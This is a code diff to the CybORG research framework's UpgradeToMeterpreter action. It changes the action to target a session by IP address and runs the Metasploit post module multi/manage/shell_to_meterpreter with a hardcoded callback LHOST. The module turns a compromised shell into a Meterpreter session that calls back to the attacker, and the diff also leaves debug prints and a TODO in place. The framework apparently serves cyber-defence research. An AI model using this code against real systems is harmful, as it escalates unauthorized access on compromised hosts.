@@ -2,6 +2,7 @@
 import string
 from ipaddress import IPv4Address
 import random
+import re
 
 from CybORG.Shared.Actions.MSFActionsFolder.MSFAction import MSFAction, lo
 
@@ -11,17 +12,18 @@ from CybORG.Shared.Observation import Observation
 
 
 class UpgradeToMeterpreter(MSFAction):
-    def __init__(self, session: int, agent: str, target_session: int):
+    def __init__(self, session: int, agent: str, ip_address: IPv4Address):
         super().__init__(session=session, agent=agent)
-        self.session_to_upgrade = target_session
+        self.ip_address = ip_address
 
     def sim_execute(self, state):
         obs = Observation()
         obs.set_success(False)
-        if self.session not in state.sessions[self.agent] or self.session_to_upgrade not in state.sessions[self.agent]:
+        # TODO: Sort ip_address to session handling
+        if self.session not in state.sessions[self.agent] or self.ip_address not in state.sessions[self.agent]:
             return obs
         server_session = state.sessions[self.agent][self.session]
-        session_to_upgrade = state.sessions[self.agent][self.session_to_upgrade]
+        session_to_upgrade = state.sessions[self.agent][self.ip_address]
 
         # action fails if either chosen session is not active or of the correct type
         if server_session.session_type != SessionType.MSF_SERVER \
@@ -95,8 +97,22 @@ class UpgradeToMeterpreter(MSFAction):
         if type(session_handler) is not MSFSessionHandler:
             obs.set_success(False)
             return obs
+
+        target_sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="shell")
+        if len(target_sessions) == 0:
+           obs.set_success(False)
+           return obs
+        session_id = list(target_sessions.keys())[0]
+        print(target_sessions[session_id])
+        # need to identify the LHOST from the session
+        ltunnel = target_sessions[session_id]["tunnel_local"]
+        tunnel_conn = re.match("(.*)-(.*):(.*)",ltunnel)
+        print(tunnel_conn)
+        direct_conn = re.match("(.*):(.*)",ltunnel)
+        print(direct_conn)
+
         output = session_handler.execute_module(mtype='post', mname='multi/manage/shell_to_meterpreter',
-                                                opts={'SESSION': self.session_to_upgrade})
+                opts={'SESSION': session_id, 'LHOST': "10.46.64.10", "verbose": "true"})
         obs.add_raw_obs(output)
         obs.set_success(False)
         for line in output.split('\n'):
@@ -131,4 +147,4 @@ class UpgradeToMeterpreter(MSFAction):
         return obs
 
     def __str__(self):
-        return super(UpgradeToMeterpreter, self).__str__() + f", Shell Session: {self.session_to_upgrade}"
+        return super(UpgradeToMeterpreter, self).__str__() + f", Hostname: {self.ip_address}"
